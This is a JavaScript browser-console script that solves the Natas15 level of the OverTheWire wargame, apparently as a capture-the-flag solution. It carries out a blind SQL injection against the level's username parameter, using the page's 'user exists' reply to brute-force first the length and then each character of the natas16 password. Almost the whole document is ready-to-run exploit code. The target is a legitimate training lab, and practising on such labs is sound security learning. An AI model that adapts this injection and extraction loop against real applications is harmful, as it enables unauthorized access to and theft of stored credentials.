/**
 * Usage: 
 *  - Navigate to Natas15 page, log in.
 *  - Open a devConsole with F12
 *  - Copy-paste this code into the console and hit enter
 * (It will use the pre-authed session)
 * It will take ~20 seconds to churn through the character combinations
 */
(async function Natas15Brute(){

    // http://natas15.natas.labs.overthewire.org/index.php?debug&username=natas16%22+AND+password+LIKE+%27a%%27+%23
    const baseUrl = 'http://natas15.natas.labs.overthewire.org/index.php?'

    function createSQL(passwordString){
        return 'username=natas16' + encodeURIComponent(`" AND password LIKE BINARY "${passwordString}`);
    }


    const reFalse = /This user doesn't exist/
    const reTrue = /This user exists\./

    function pageSuccess (html){
        if(reFalse.test(html)){
            return false
        } else if (reTrue.test(html)){
            return true
        }
        console.error(`Couldn't determine from html:\n${html}\n${''.padStart(50,'-')}`);
        throw Error('Whoops');
    }
    
    
    //Get password length:
    let passwordLengthFound =false;
    let passwordLength = 0;
    while ( (!passwordLengthFound) && passwordLength < 100){
        //Send request:
        const html = await (await fetch(baseUrl + createSQL(''.padStart(passwordLength,'_')))).text();
        if (pageSuccess(html)){
            passwordLengthFound = true;
        } else {
            passwordLength++;
        }
    }
    
    console.log(`Password found to be ${passwordLength} chars long`);
    
    //Set possible password characters:
    const alphaNum = (new Array(36)).fill(0).map((x,i)=> i.toString(36)).join('');
    const alphaWithCaps = alphaNum + alphaNum.toUpperCase().substr(10);

    //Get password:
    let pass = '';
    for(let i=0; i<passwordLength; i++){
        let charDetermined = false;
        let j=0;
        while (!charDetermined && j < alphaWithCaps.length){
            const passAttempt = `${pass}${alphaWithCaps[j]}`;
            const html = await (await fetch(baseUrl + createSQL(`${passAttempt}%`))).text();
            if (pageSuccess(html)) {
                pass = passAttempt;
                charDetermined = true;
            } else {
                j++;
            }
        }
        console.log(`Cracked up to:\t ${pass.padEnd(passwordLength,'*')}`);
    }
    console.log(`Username: natas16\nPassword: ${pass}`);

})();